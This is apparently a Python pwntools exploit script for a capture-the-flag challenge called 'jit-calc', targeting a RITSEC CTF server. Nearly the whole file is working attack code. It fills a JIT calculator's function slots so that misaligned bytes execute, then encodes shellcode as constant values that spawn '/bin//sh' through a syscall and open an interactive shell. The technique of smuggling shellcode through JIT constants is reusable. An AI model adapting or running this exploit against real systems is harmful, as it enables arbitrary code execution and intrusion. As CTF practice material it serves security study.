from pwn import *

# Constants found by manual exp
BINSH_HEX = 0x68732f2f6e69622f


def i2b(i):
    return str(i).encode('utf-8')


def read_welcome_msg():
    MAIN_MENU = (
        b'Welcome to our super fast JIT calculator\n',
        b'If you\'re looking for fast computation, you came to the right place!\n',
        b'None of that slow interpreted stuff here\n',
        b'\n',
        b'\n',
        b'Notice: You can only use 1000 bytes per function, so we provided 8 spaces for functions.\n',
        b'Code result: 123456789\n'
    )
    p.recvuntil(
        MAIN_MENU
    )


def read_main_menu():
    p.recvuntil(
        b'4: Run code\n',
    )


def swap_index(new_idx):
    read_main_menu()
    p.sendline(b'1')
    p.sendlineafter(
        b'Using option 1.\n'
        b'What index would you like to change to (0-9)\n',
        i2b(new_idx))
    p.recvline()


def run_code():
    read_main_menu()
    p.sendline(b'4')
    p.recvuntil(b'Using option 4.\n')


def read_write_code_menu():
    READ_MENU = (
        b'1: Finish Function\n',
        b'2: Write Addition\n',
        b'3: Write Constant Value\n',
    )
    p.recvuntil(READ_MENU)


def start_writing_code():
    read_main_menu()
    p.sendline(b'2')
    p.recvuntil(b'Using option 2.\n')


def write_addition(x):
    read_write_code_menu()
    p.sendline(b'2')
    p.sendlineafter(
        b'4: Add Register 2 to Register 2\n',
        i2b(x)
    )


def write_constant_value(reg, val):
    read_write_code_menu()
    p.sendline(b'3')
    p.recvuntil(
        b'1: Store to register 1\n',
        b'2: Store to register 2\n',
    )
    if reg == 1:
        p.sendline(b'\x01')
    else:
        p.sendline(b'\x02')
    p.sendlineafter(b'Enter the constant:\n', i2b(val))


def end_writing_code():
    read_write_code_menu()
    p.sendline(b'1')


###############################################################################
## Setup the environment
###############################################################################
context.log_level = 'debug'
e = ELF('./jit-calc')
if len(sys.argv) >= 2 and sys.argv[1] == 'remote':
    p = remote('ctfchallenges.ritsec.club', 8000)
else:
    p = process('jit-calc')

if len(sys.argv) >= 3 and sys.argv[2] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER key to send payload')



###############################################################################
## Exploit
###############################################################################
read_welcome_msg()

# Fill slot 0 with some 987 bytes without ret statement. Note that this will
# lead to asymmetry
start_writing_code()
for i in range(8):
    write_addition(1)
for i in range(95):
    write_constant_value(1, e.got['exit'])
write_constant_value(2, BINSH_HEX - e.got['exit'])
write_addition(1) # add rbx,rax
log.info(f"[x] filled 987 bytes and created magic assymetry")

swap_index(1)
start_writing_code()
write_constant_value(1, 0x00000000000008eb)  
write_constant_value(1, 0x0003ebc4fe58426a) # push 0x42; pop rax; inc ah;
write_constant_value(1, 0x0003eb5f53529948) # cqo; push rdx; push rbx; pop rdi;
write_constant_value(1, 0x02ebd089495e5457) # push rdi; push $rsp; pop rsi; mov r8,rdx;
write_constant_value(1, 0x000000050fd28949) # mov r10,rdx; syscall
end_writing_code()

swap_index(0)
run_code()

p.interactive()
